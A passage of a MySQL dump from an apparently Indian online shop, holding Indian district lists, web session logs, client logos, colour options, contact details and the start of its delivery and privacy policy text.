(130, 1, 18, 'Baloda Bazar', 0, 0),
(131, 1, 18, 'Balrampur', 0, 0),
(132, 1, 18, 'Bastar', 0, 0),
(133, 1, 18, 'Bemetara', 0, 0),
(134, 1, 18, 'Dantewada', 0, 0),
(135, 1, 18, 'Dhamtari', 0, 0),
(136, 1, 18, 'Durg', 0, 0),
(137, 1, 18, 'Gariaband', 0, 0),
(138, 1, 18, 'Gaurella-Penda-Marwahi', 0, 0),
(139, 1, 18, 'Janjgir-Champa', 0, 0),
(140, 1, 18, 'Jashpur', 0, 0),
(141, 1, 18, 'Kabirdham', 0, 0),
(142, 1, 18, 'Kanker', 0, 0),
(143, 1, 18, 'Kobra', 0, 0),
(144, 1, 18, 'Kondagaon', 0, 0),
(145, 1, 18, 'Koriya', 0, 0),
(146, 1, 18, 'Mahasamund', 0, 0),
(147, 1, 18, 'Mungeli', 0, 0),
(148, 1, 18, 'Narayanapur', 0, 0),
(149, 1, 18, 'Raigarh', 0, 0),
(150, 1, 18, 'Rajanandgaon', 0, 0),
(151, 1, 18, 'Sukma', 0, 0),
(152, 1, 18, 'Surajpur', 0, 0),
(153, 1, 18, 'Surguja', 0, 0),
(154, 1, 19, 'Central Delhi', 0, 0),
(155, 1, 19, 'East Delhi', 0, 0),
(156, 1, 19, 'New Delhi', 0, 0),
(157, 1, 19, 'North Delhi', 0, 0),
(158, 1, 19, 'North East Delhi', 0, 0),
(159, 1, 19, 'North West Delhi', 0, 0),
(160, 1, 19, 'Shahdara', 0, 0),
(161, 1, 19, 'South Delhi', 0, 0),
(162, 1, 19, 'South East Delhi', 0, 0),
(163, 1, 19, 'South West Delhi', 0, 0),
(164, 1, 20, 'North Goa', 0, 0),
(165, 1, 20, 'South Goa', 0, 0),
(166, 1, 21, 'Ahmedabad', 0, 0),
(167, 1, 21, 'Ahmedabad', 0, 0),
(168, 1, 21, 'Amreli', 0, 0),
(169, 1, 21, 'Anand', 0, 0),
(170, 1, 21, 'Aravalli', 0, 0),
(171, 1, 21, 'Banaskantha', 0, 0),
(172, 1, 21, 'Bharuch', 0, 0),
(173, 1, 21, 'Bhavnagar', 0, 0),
(174, 1, 21, 'Botad', 0, 0),
(175, 1, 21, 'Chhota Udepur', 0, 0),
(176, 1, 21, 'Dahod', 0, 0),
(177, 1, 21, 'Dang', 0, 0),
(178, 1, 21, 'Devbhoomi Dwaraka', 0, 0),
(179, 1, 21, 'Gandhinagar', 0, 0),
(180, 1, 21, 'Gir Somanth', 0, 0),
(181, 1, 21, 'Jamnagar', 0, 0),
(182, 1, 21, 'Junagadh', 0, 0),
(183, 1, 21, 'Kheda', 0, 0),
(184, 1, 21, 'Kutch', 0, 0),
(185, 1, 21, 'Mahisagar', 0, 0),
(186, 1, 21, 'Mehsana', 0, 0),
(187, 1, 21, 'Morbi', 0, 0),
(188, 1, 21, 'Narmada', 0, 0),
(189, 1, 21, 'Navsari', 0, 0),
(190, 1, 21, 'Panchmahal', 0, 0),
(191, 1, 21, 'Patan', 0, 0),
(192, 1, 22, 'Ambala', 0, 0),
(193, 1, 22, 'Bhiwan', 0, 0),
(194, 1, 22, 'Charkhi Dadri', 0, 0),
(195, 1, 22, 'Faridabad', 0, 0),
(196, 1, 22, 'Fatehabad', 0, 0),
(197, 1, 22, 'Gurgaon', 0, 0),
(198, 1, 22, 'Hissar', 0, 0),
(199, 1, 22, 'Jhajjar', 0, 0),
(200, 1, 22, 'Jind', 0, 0),
(201, 1, 22, 'Kaithal', 0, 0),
(202, 1, 22, 'Karnal', 0, 0),
(203, 1, 22, 'Kurukshetra', 0, 0),
(204, 1, 22, 'Mahendragarh', 0, 0),
(205, 1, 22, 'Nuh', 0, 0),
(206, 1, 22, 'Palwal', 0, 0),
(207, 1, 22, 'Panchkula', 0, 0),
(208, 1, 22, 'Panipat', 0, 0),
(209, 1, 22, 'Rewari', 0, 0),
(210, 1, 22, 'Rohtak', 0, 0),
(211, 1, 22, 'Sirsa', 0, 0),
(212, 1, 22, 'Sonipat', 0, 0),
(213, 1, 22, 'Yamuna Naga', 0, 0),
(214, 1, 23, 'Bilaspur', 0, 0),
(215, 1, 23, 'Chamba', 0, 0),
(216, 1, 23, 'Hamirpur', 0, 0),
(217, 1, 23, 'Kangra', 0, 0),
(218, 1, 23, 'Kinnaur', 0, 0),
(219, 1, 23, 'Kullu', 0, 0),
(220, 1, 23, 'Lahaul and Spiti', 0, 0),
(221, 1, 23, 'Mandi', 0, 0),
(222, 1, 23, 'Shimla', 0, 0),
(223, 1, 23, 'Sirmaur', 0, 0),
(224, 1, 23, 'Solan', 0, 0),
(225, 1, 23, 'Una', 0, 0),
(226, 1, 25, 'Alappuzha', 0, 0),
(227, 1, 25, 'Ernakulam', 0, 0),
(228, 1, 25, 'Idukki', 0, 0),
(229, 1, 25, 'Kannur', 0, 0),
(230, 1, 25, 'Kassaragod', 0, 0),
(231, 1, 25, 'Kollam', 0, 0),
(232, 1, 25, 'Kottayam', 0, 0),
(233, 1, 25, 'Kozhikode', 0, 0),
(234, 1, 25, 'Malappuram', 0, 0),
(235, 1, 25, 'Palakkad', 0, 0),
(236, 1, 25, 'Pathanamthitta', 0, 0),
(237, 1, 25, 'Thiruvananthapuram', 0, 0),
(238, 1, 25, 'Thrissur', 0, 0),
(239, 1, 25, 'Wayanad', 0, 0),
(240, 1, 26, 'Agar Malwa', 0, 0),
(241, 1, 26, 'Alirajpur', 0, 0),
(242, 1, 26, 'Anuppur', 0, 0),
(243, 1, 26, 'Ashok Nagar', 0, 0),
(244, 1, 26, 'Balaghat', 0, 0),
(245, 1, 26, 'Barwani', 0, 0),
(246, 1, 26, 'Betul', 0, 0),
(247, 1, 26, 'Bhind', 0, 0),
(248, 1, 26, 'Bhopal', 0, 0),
(249, 1, 26, 'Burhanpur', 0, 0),
(250, 1, 26, 'Chachaura Binaganj', 0, 0),
(251, 1, 26, 'Chhatarapur', 0, 0),
(252, 1, 26, 'Chhindwara', 0, 0),
(253, 1, 26, 'Damoh', 0, 0),
(254, 1, 26, 'Datia', 0, 0),
(255, 1, 26, 'Dewas', 0, 0),
(256, 1, 26, 'Dhar', 0, 0),
(257, 1, 26, 'Dindori', 0, 0),
(258, 1, 26, 'Guna', 0, 0),
(259, 1, 26, 'Gwalior', 0, 0),
(260, 1, 26, 'Harda', 0, 0),
(261, 1, 26, 'Hoshangabad', 0, 0),
(262, 1, 26, 'Indore', 0, 0),
(263, 1, 26, 'Jabalpur', 0, 0),
(264, 1, 26, 'Jhabua', 0, 0),
(265, 1, 26, 'Katni', 0, 0),
(266, 1, 26, 'Khandwa', 0, 0),
(267, 1, 26, 'Khargone', 0, 0),
(268, 1, 26, 'Maihar', 0, 0),
(269, 1, 26, 'Mandla', 0, 0),
(270, 1, 26, 'Mandsaur', 0, 0),
(271, 1, 26, 'Morena', 0, 0),
(272, 1, 26, 'Nagda', 0, 0),
(273, 1, 26, 'Narsinghpur', 0, 0),
(274, 1, 26, 'Neemuch', 0, 0),
(275, 1, 26, 'Niwari', 0, 0),
(276, 1, 26, 'Panna', 0, 0),
(277, 1, 26, 'Raisen', 0, 0),
(278, 1, 26, 'Rajgarh', 0, 0),
(279, 1, 26, 'Ratlam', 0, 0),
(280, 1, 26, 'Rewa', 0, 0),
(281, 1, 26, 'Sagar', 0, 0),
(282, 1, 26, 'Satna', 0, 0),
(283, 1, 26, 'Sehore', 0, 0),
(284, 1, 26, 'Seoni', 0, 0),
(285, 1, 26, 'Shahdol', 0, 0),
(286, 1, 26, 'Shajapur', 0, 0),
(287, 1, 26, 'Sheopur', 0, 0),
(288, 1, 26, 'Shivpuri', 0, 0),
(289, 1, 26, 'Sidhi', 0, 0),
(290, 1, 26, 'Singrauli', 0, 0),
(291, 1, 26, 'Tikamgarh', 0, 0),
(292, 1, 26, 'Ujjain', 0, 0),
(293, 1, 26, 'Umaria', 0, 0),
(294, 1, 26, 'Vidisha', 0, 0),
(295, 1, 27, 'Ahmednagar', 0, 0),
(296, 1, 27, 'Akola', 0, 0),
(297, 1, 27, 'Amravati', 0, 0),
(298, 1, 27, 'Aurangabd', 0, 0),
(299, 1, 27, 'Beed', 0, 0),
(300, 1, 27, 'Bhandara', 0, 0),
(301, 1, 27, 'Buldhana', 0, 0),
(302, 1, 27, 'Chandrapur', 0, 0),
(303, 1, 27, 'Dhule', 0, 0),
(304, 1, 27, 'Gadchiroli', 0, 0),
(305, 1, 27, 'Gondia', 0, 0),
(306, 1, 27, 'Hingoli', 0, 0),
(307, 1, 27, 'Jalgaon', 0, 0),
(308, 1, 27, 'Jalna', 0, 0),
(309, 1, 27, 'Kolhapur', 0, 0),
(310, 1, 27, 'Latur', 0, 0),
(311, 1, 27, 'Mumbai City', 0, 0),
(312, 1, 27, 'Mumbai suburban', 0, 0),
(313, 1, 27, 'Nagpur', 0, 0),
(314, 1, 27, 'Nanded', 0, 0),
(315, 1, 27, 'nandurbar', 0, 0),
(316, 1, 27, 'Nashik', 0, 0),
(317, 1, 27, 'Osmanabad', 0, 0),
(318, 1, 27, 'Palghar', 0, 0),
(319, 1, 27, 'Parbhani', 0, 0),
(320, 1, 27, 'Pune', 0, 0),
(321, 1, 27, 'Raigad', 0, 0),
(322, 1, 27, 'Ratnahiri', 0, 0),
(323, 1, 27, 'Sangli', 0, 0),
(324, 1, 27, 'Satara', 0, 0),
(325, 1, 27, 'Sindhudurg', 0, 0),
(326, 1, 27, 'Solapur', 0, 0),
(327, 1, 27, 'Thane', 0, 0),
(328, 1, 27, 'Wardha', 0, 0),
(329, 1, 27, 'Washim', 0, 0),
(330, 1, 27, 'Yavatmal', 0, 0),
(331, 1, 1, 'Bagalkot', 0, 0),
(332, 1, 1, 'Belgaum', 0, 0),
(333, 1, 1, 'Bellary', 0, 0),
(334, 1, 1, 'Bidar', 0, 0),
(335, 1, 1, 'Bijapur', 0, 0),
(336, 1, 1, 'Chamarajanagar', 0, 0),
(337, 1, 1, 'Chikkaballapur', 0, 0),
(338, 1, 1, 'Chikkamagaluru', 0, 0),
(339, 1, 1, 'Chitradurga', 0, 0),
(340, 1, 1, 'Dakshina Kannada', 0, 0),
(341, 1, 1, 'Davanagere', 0, 0),
(342, 1, 1, 'Dharwad', 0, 0),
(343, 1, 1, 'Gadag', 0, 0),
(344, 1, 1, 'Gulbarga', 0, 0),
(345, 1, 1, 'Hassan', 0, 0),
(346, 1, 1, 'Haveri', 0, 0),
(347, 1, 1, 'Mumbai', 0, 0),
(348, 1, 1, 'Mandya', 0, 0),
(349, 1, 1, 'Raichur', 0, 0),
(350, 1, 1, 'Ramanagara', 0, 0),
(351, 1, 1, 'Shimoga', 0, 0),
(352, 1, 1, 'Udupi', 0, 0),
(353, 1, 1, 'Uttara Kannada', 0, 0),
(354, 1, 1, 'Yadgir', 0, 0),
(355, 1, 28, 'Bishnupur', 0, 0),
(356, 1, 28, 'Chandel', 0, 0),
(357, 1, 28, 'Churachandpur', 0, 0),
(358, 1, 28, 'Imphal East', 0, 0),
(359, 1, 28, 'Imphal west', 0, 0),
(360, 1, 28, 'Jiribam', 0, 0),
(361, 1, 28, 'Kakching', 0, 0),
(362, 1, 28, 'Kamjong', 0, 0),
(363, 1, 28, 'Kangpokpi', 0, 0),
(364, 1, 28, 'Noney', 0, 0),
(365, 1, 28, 'Pherzawl', 0, 0),
(366, 1, 28, 'Senapati', 0, 0),
(367, 1, 28, 'Tamenglong', 0, 0),
(368, 1, 28, 'Tengnoupal', 0, 0),
(369, 1, 28, 'Thoubal', 0, 0),
(370, 1, 28, 'Ukhrul', 0, 0),
(371, 1, 29, 'East Garo Hills', 0, 0),
(372, 1, 29, 'East Jaintia Hills', 0, 0),
(373, 1, 29, 'East Khasi Hills', 0, 0),
(374, 1, 29, 'North Garo Hills', 0, 0),
(375, 1, 29, 'Ri Bhoi', 0, 0),
(376, 1, 29, 'South Garo Hills', 0, 0),
(377, 1, 29, 'South West Garo Hills', 0, 0),
(378, 1, 29, 'South West Khasi Hills', 0, 0),
(379, 1, 29, 'West Garo Hills', 0, 0),
(380, 1, 29, 'West Jaintia Hill', 0, 0),
(381, 1, 29, 'West Khasi Hills', 0, 0);

-- --------------------------------------------------------

--
-- Table structure for table `ci_sessions`
--

CREATE TABLE `ci_sessions` (
  `session_id` varchar(40) NOT NULL DEFAULT '0',
  `ip_address` varchar(45) NOT NULL DEFAULT '0',
  `user_agent` varchar(120) NOT NULL,
  `last_activity` int(10) UNSIGNED NOT NULL DEFAULT '0',
  `user_data` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `ci_sessions`
--

INSERT INTO `ci_sessions` (`session_id`, `ip_address`, `user_agent`, `last_activity`, `user_data`) VALUES
('6b76ec772b0352ab291b5f4225bcdb82', '157.50.1.95', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36', 1647161525, ''),
('f20f11af37035bdf5c55043bbbf2c54b', '203.86.233.152', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36', 1647160554, ''),
('da8d801ef0a5e42d9e89d9e021d8cd70', '203.86.233.152', '', 1647160389, ''),
('1692d183cb8eb3f59973148b7d30cff2', '203.86.233.152', '', 1647160378, ''),
('660a53638f9ee4a8cc9fd8b74696aa68', '203.86.233.152', '', 1647160389, ''),
('f68fca4f687eb0ce1351f56b7701e682', '203.86.233.152', '', 1647160172, ''),
('04ac7505c55603a524bd3a9f97facea8', '45.137.21.208', 'Go-http-client/1.1', 1647159586, ''),
('10e09f082fdd99f5327753658a650e9a', '185.254.196.217', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 1647159386, ''),
('f087671ba12a7a8fbd090a65580a2b6d', '185.254.196.217', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 1647180960, ''),
('c7559dc131982b993a624f03347784b7', '135.125.244.48', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 1647179207, ''),
('198dbf85cc93de22068f59ffec63bec1', '20.113.177.5', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 1647174713, ''),
('ae7d50c758236a928cc72c37b136c36c', '135.125.244.48', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 1647173953, ''),
('c0aeada634e89b62d1e04236e2b463a6', '20.25.64.44', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 1647172808, ''),
('afdfa38381a316e29f22b5274b2febab', '34.140.248.32', 'python-requests/2.27.1', 1647170569, ''),
('dfe4e86d5dc43e785e5f9c15cce561fa', '186.235.251.33', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36', 1647170771, ''),
('c890bca58be2e493fc8d9dbc4d917f86', '185.254.196.217', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 1647170158, ''),
('b8e08334223d9ddfd3ed53256661958b', '135.125.244.48', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 1647168596, '');

-- --------------------------------------------------------

--
-- Table structure for table `clients`
--

CREATE TABLE `clients` (
  `id` int(255) NOT NULL,
  `client_image` varchar(2000) NOT NULL,
  `status` int(11) NOT NULL,
  `created_date` datetime NOT NULL,
  `order_no` int(11) NOT NULL,
  `modified_date` datetime NOT NULL,
  `name` varchar(255) NOT NULL,
  `category` varchar(255) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `clients`
--

INSERT INTO `clients` (`id`, `client_image`, `status`, `created_date`, `order_no`, `modified_date`, `name`, `category`) VALUES
(1, 'assets/client_images/client14400647831.jpg', 0, '2015-08-06 14:41:46', 4, '2015-08-20 15:30:53', 'Infosys', 'Corporate'),
(2, 'assets/client_images/client14400646151.jpg', 0, '2015-08-06 14:44:41', 3, '2015-08-20 15:30:15', 'Capgemini', 'Corporate'),
(3, 'assets/client_images/client14400645031.jpg', 0, '2015-08-07 14:10:44', 6, '2015-08-20 15:30:44', 'HP', 'Corporate'),
(4, 'assets/client_images/client14400644061.jpg', 0, '2015-08-18 15:27:59', 5, '2015-08-20 15:30:27', 'Dell', 'Corporate'),
(6, 'assets/client_images/client14400630761.jpg', 0, '2015-08-19 18:04:09', 2, '2015-08-20 15:01:16', 'Altisource', 'Corporate'),
(7, 'assets/client_images/client14400630441.jpg', 0, '2015-08-19 18:30:51', 1, '2015-08-20 15:00:44', 'Accenture', 'Corporate'),
(8, 'assets/client_images/client1440064956.jpg', 0, '2015-08-20 15:32:36', 7, '0000-00-00 00:00:00', 'Cognizant', 'Corporate'),
(9, 'assets/client_images/client1440065480.jpg', 0, '2015-08-20 15:41:20', 8, '0000-00-00 00:00:00', 'Oracle', 'Corporate'),
(10, 'assets/client_images/client1440065556.jpg', 0, '2015-08-20 15:42:36', 9, '0000-00-00 00:00:00', 'Tech mahindra', 'Corporate'),
(11, 'assets/client_images/client1440065631.jpg', 0, '2015-08-20 15:43:51', 10, '0000-00-00 00:00:00', 'TCS', 'Corporate'),
(12, 'assets/client_images/client1440068878.jpg', 0, '2015-08-20 16:37:58', 11, '0000-00-00 00:00:00', 'mu sigma', 'Corporate'),
(13, 'assets/client_images/client1440068977.jpg', 0, '2015-08-20 16:39:37', 12, '0000-00-00 00:00:00', 'Google', 'Corporate'),
(14, 'assets/client_images/client1440070399.jpg', 0, '2015-08-20 17:03:19', 13, '0000-00-00 00:00:00', 'Microsoft', 'Corporate'),
(15, 'assets/client_images/client1440070460.jpg', 0, '2015-08-20 17:04:20', 14, '0000-00-00 00:00:00', 'Yahoo', 'Corporate'),
(16, 'assets/client_images/client1440070572.jpg', 0, '2015-08-20 17:06:12', 15, '0000-00-00 00:00:00', 'ITC', 'Corporate'),
(17, 'assets/client_images/client1440070643.jpg', 0, '2015-08-20 17:07:23', 16, '0000-00-00 00:00:00', 'Schneider', 'Corporate'),
(18, 'assets/client_images/client1440070731.jpg', 0, '2015-08-20 17:08:51', 17, '2015-08-28 15:13:40', 'Sagar', 'Hospitals'),
(19, 'assets/client_images/client1440070853.jpg', 0, '2015-08-20 17:10:53', 18, '2015-08-28 15:13:29', 'Apollo', 'Hospitals'),
(20, 'assets/client_images/client1440071046.jpg', 0, '2015-08-20 17:14:06', 19, '2015-08-28 15:13:17', 'Columbia Asia', 'Hospitals'),
(21, 'assets/client_images/client1440071319.jpg', 0, '2015-08-20 17:18:39', 20, '2015-08-28 15:13:01', 'Fortis', 'Hospitals'),
(22, 'assets/client_images/client1440071502.jpg', 0, '2015-08-20 17:21:42', 21, '2015-08-28 15:12:50', 'Narayana Hrudayala Hospital', 'Hospitals'),
(23, 'assets/client_images/client1440074848.jpg', 0, '2015-08-20 18:17:28', 1, '2015-08-28 15:10:23', 'Sakar Hospital', 'Hospitals'),
(24, 'assets/client_images/client1440074889.jpg', 0, '2015-08-20 18:18:09', 1, '0000-00-00 00:00:00', 'Le Merldien', 'Hotels'),
(25, 'assets/client_images/client1440074927.jpg', 0, '2015-08-20 18:18:47', 23, '2015-08-28 15:11:54', 'Cloud Nine', 'Hospitals'),
(26, 'assets/client_images/client14401401161.jpg', 0, '2015-08-20 18:18:55', 2, '2015-08-21 12:25:16', 'Sheraton', 'Hotels'),
(27, 'assets/client_images/client1440075049.jpg', 0, '2015-08-20 18:20:49', 24, '2015-08-24 15:49:39', 'Jindal ', 'Corporate'),
(28, 'assets/client_images/client14401399511.jpg', 0, '2015-08-20 18:20:56', 1, '2015-08-21 12:22:31', 'Audi', 'Others'),
(29, 'assets/client_images/client14401399361.jpg', 0, '2015-08-20 18:22:31', 2, '2015-08-21 12:22:16', 'Benz', 'Others'),
(30, 'assets/client_images/client1440075266.jpg', 0, '2015-08-20 18:24:26', 3, '0000-00-00 00:00:00', 'BGC', 'Others'),
(31, 'assets/client_images/client1440075282.jpg', 0, '2015-08-20 18:24:42', 25, '2015-08-24 15:51:14', 'Isro', 'Medical Shops'),
(32, 'assets/client_images/client1440075353.jpg', 0, '2015-08-20 18:25:53', 26, '2015-08-24 15:50:24', 'Hal', 'Corporate'),
(33, 'assets/client_images/client14401399181.jpg', 0, '2015-08-20 18:25:59', 4, '2015-08-21 12:21:58', 'ClubMahindra', 'Others'),
(34, 'assets/client_images/client1440075440.jpg', 0, '2015-08-20 18:27:20', 5, '0000-00-00 00:00:00', 'Toyota', 'Others'),
(35, 'assets/client_images/client14430984441.jpg', 0, '2015-08-20 18:28:05', 27, '2015-09-24 18:10:44', 'Bel', 'Corporate'),
(36, 'assets/client_images/client1440075661.jpg', 0, '2015-08-20 18:31:01', 1, '0000-00-00 00:00:00', 'Brigade', 'Real Estate'),
(37, 'assets/client_images/client1440140189.jpg', 0, '2015-08-21 12:26:29', 2, '0000-00-00 00:00:00', 'Mantri', 'Real Estate'),
(38, 'assets/client_images/client1440140226.jpg', 0, '2015-08-21 12:27:06', 3, '0000-00-00 00:00:00', 'Salarpuria', 'Real Estate'),
(39, 'assets/client_images/client1440140265.jpg', 0, '2015-08-21 12:27:45', 4, '0000-00-00 00:00:00', 'Purvankara', 'Real Estate'),
(40, 'assets/client_images/client1440140311.jpg', 0, '2015-08-21 12:28:31', 5, '0000-00-00 00:00:00', 'Confident', 'Real Estate'),
(41, 'assets/client_images/client1440140337.jpg', 0, '2015-08-21 12:28:57', 6, '0000-00-00 00:00:00', 'JLL', 'Real Estate'),
(42, 'assets/client_images/client14430847121.jpg', 1, '2015-08-21 12:41:35', 1, '2015-09-24 14:21:52', 'Rati Associates', 'Real Estate'),
(43, 'assets/client_images/client1440141167.jpg', 1, '2015-08-21 12:42:47', 2, '0000-00-00 00:00:00', 'Exotic Innovations', 'Real Estate'),
(44, 'assets/client_images/client16134669471.jpg', 1, '2015-08-24 15:52:58', 28, '2021-02-16 14:45:47', 'BEML', 'Corporate'),
(45, 'assets/client_images/client1440755748.jpg', 0, '2015-08-28 15:25:48', 2, '0000-00-00 00:00:00', 'Rati Associates', 'Architect & Interior Designers'),
(46, 'assets/client_images/client1440755846.jpg', 0, '2015-08-28 15:27:26', 1, '0000-00-00 00:00:00', 'Exotic Innovations', 'Architect & Interior Designers'),
(47, 'assets/client_images/client16130473971.jpg', 1, '2015-09-24 12:48:31', 1, '2021-02-11 18:13:17', 'Manipal', 'Hospitals'),
(49, 'assets/client_images/client1613557429.jpg', 1, '2021-02-17 15:53:49', 1, '2021-02-17 15:53:49', 'Chaithra', 'Hospitals'),
(50, 'assets/client_images/client16135632011.jpg', 1, '2021-02-17 17:29:52', 66, '2021-02-17 17:30:01', 'Chaithra', 'Hospitals');

-- --------------------------------------------------------

--
-- Table structure for table `clientscategory`
--

CREATE TABLE `clientscategory` (
  `id` int(255) NOT NULL,
  `name` varchar(255) NOT NULL,
  `status` int(11) NOT NULL,
  `order_no` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `clientscategory`
--

INSERT INTO `clientscategory` (`id`, `name`, `status`, `order_no`) VALUES
(1, 'Hospitals', 0, 3),
(2, 'Others', 1, 7),
(9, 'Architect & Interior Designers', 0, 5),
(4, 'Corporate', 0, 1),
(5, 'Hotels', 0, 2),
(6, 'Real Estate', 0, 4);

-- --------------------------------------------------------

--
-- Table structure for table `colors`
--

CREATE TABLE `colors` (
  `id` int(255) NOT NULL,
  `name` varchar(2000) NOT NULL,
  `page_url` text NOT NULL,
  `status` varchar(2000) NOT NULL,
  `order_no` varchar(2000) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `colors`
--

INSERT INTO `colors` (`id`, `name`, `page_url`, `status`, `order_no`) VALUES
(1, 'Pink', 'pink', '0', '1'),
(2, 'Red', 'red', '0', '1'),
(3, 'Yellow', 'yellow', '1', '3'),
(4, 'Blue', 'blue', '0', '1'),
(5, 'Multicolor', 'multicolor', '0', '1'),
(6, 'Green', 'green', '0', '1'),
(7, 'Orange', 'orange', '0', '1'),
(8, 'White', 'white', '0', '1'),
(9, 'Maroon', 'maroon', '0', '1'),
(10, 'Autumn', 'autumn', '1', '1'),
(11, 'Peach', 'peach', '0', '1'),
(13, 'Brown', 'brown', '0', '1'),
(15, 'Gold', 'gold', '0', '1'),
(16, 'Silver', 'silver', '0', '1'),
(26, 'blacks', 'black', '2', '1'),
(18, 'Gray', 'gray', '0', '1'),
(19, 'F Green', 'f-green', '0', '1'),
(20, 'Dry Peach', 'dry-peach', '0', '1'),
(27, 'black', 'black-1', '2', '1');

-- --------------------------------------------------------

--
-- Table structure for table `contactus`
--

CREATE TABLE `contactus` (
  `id` int(255) NOT NULL,
  `address` varchar(2000) NOT NULL,
  `phone` varchar(2000) NOT NULL,
  `email` varchar(2000) NOT NULL,
  `time` varchar(255) NOT NULL,
  `iframe` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `contactus`
--

INSERT INTO `contactus` (`id`, `address`, `phone`, `email`, `time`, `iframe`) VALUES
(1, '', '+91 9886203199', 'support@gogarbha.com', '9:30am - 6:30PM', '');

-- --------------------------------------------------------

--
-- Table structure for table `contactus_kushal`
--

CREATE TABLE `contactus_kushal` (
  `id` int(255) NOT NULL,
  `address` varchar(2000) NOT NULL,
  `phone` varchar(2000) NOT NULL,
  `email` varchar(2000) NOT NULL,
  `time` varchar(255) NOT NULL,
  `iframe` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `contactus_kushal`
--

INSERT INTO `contactus_kushal` (`id`, `address`, `phone`, `email`, `time`, `iframe`) VALUES
(1, '<p><strong>Kushal Indoor Garden</strong><br />\n#8, Jewellers Street,<br />\nOff Commercial Street,<br />\nOpp KFC Cross Road,<br />\nBangalore - 560 001</p>\n', '080 25588985', 'kusalblr@gmail.com', '10:30 AM to 7:00 PM', 'https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3887.831533141595!2d77.6076822!3d12.982624699999999!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3bae166278e89c87%3A0x161ed3e21f9c476f!2sKusal+Indoor+Garden!5e0!3m2!1sen!2sin!4v1441439008160');

-- --------------------------------------------------------

--
-- Table structure for table `failedpincode`
--

CREATE TABLE `failedpincode` (
  `id` int(11) NOT NULL,
  `pincode` varchar(100) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `failedpincode`
--

INSERT INTO `failedpincode` (`id`, `pincode`) VALUES
(1, '560034'),
(2, '560054');

-- --------------------------------------------------------

--
-- Table structure for table `footer_policy`
--

CREATE TABLE `footer_policy` (
  `id` int(255) NOT NULL,
  `deliveryinfo_policy` text NOT NULL,
  `privacy_policy` text NOT NULL,
  `customerservice` text NOT NULL,
  `terms_of_use` text NOT NULL,
  `conditions` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `footer_policy`
--

INSERT INTO `footer_policy` (`id`, `deliveryinfo_policy`, `privacy_policy`, `customerservice`, `terms_of_use`, `conditions`) VALUES
(0, '<ul>\r\n<li>All orders are processed within 2 or 3 business days from the date of booking. All orders placed during the weekend or on a public holiday will be sent on the next business day.</li>\r\n<li>Please note that we shall be unable to modify the delivery address once you have placed your order. Once your order has been dispatched, we will send you a confirmation email with tracking information. You will be able to track your package directly on the carrier&rsquo;s website.</li>\r\n<li>We want you to be completely happy with your purchase - please read our return &amp; refund policy for detailed information about our processes.</li>\r\n<li>If you have any questions, please contact our customer service team on <a href=\"mailto:support@gogarbha.com\">support@gogarbha.com</a></li>\r\n</ul>\r\n<p>&nbsp;</p>\r\n<p>&nbsp;</p>\r\n<p>&nbsp;</p>', '<p><strong>WHAT DO WE DO WITH YOUR INFORMATION?</strong></p>\r\n<p>When you purchase something from our store, as part of the buying and selling process, we collect the personal information you give us such as your name, address and email address.</p>\r\n<p>When you browse our store, we also automatically receive your computer&rsquo;s internet protocol (IP) address in order to provide us with information that helps us learn about your browser and operating system.<br />Email marketing (if applicable): With your permission, we may send you emails about our store, new products and other updates.</p>\r\n<p><strong>CONSENT</strong></p>\r\n<p>When you provide us with personal information to complete a transaction, verify your credit card, place an order, arrange for a delivery or return a purchase, we imply that you consent to our collecting it and using it for that specific reason only.<br />If we ask for your personal information for a secondary reason, like marketing, we will either ask you directly for your expressed consent, or provide you with an opportunity to say no.</p>\r\n<p><strong>EMAIL OPT - OUT</strong></p>\r\n<p>If after you opt-in, you change your mind, you may withdraw your consent for us to contact you, for the continued collection, use or disclosure of your information, at anytime, by contacting us at&nbsp; <a href=\"mailto:support@gogarbha.com\">support@gogarbha.com</a></p>\r\n<p><strong>DISCLOSURE</strong></p>\r\n<p>We may disclose your personal information if we are required by law to do so or if you violate our Terms of Service.</p>\r\n<p><strong>PAYMENT</strong></p>\r\n<p>If you choose a direct payment gateway to complete your purchase, then we store your credit card data. Your purchase transaction data is stored only as long as is necessary to complete your purchase transaction. After that is complete, your purchase transaction information is deleted.</p>\r\n<p><strong>THIRD-PARTY 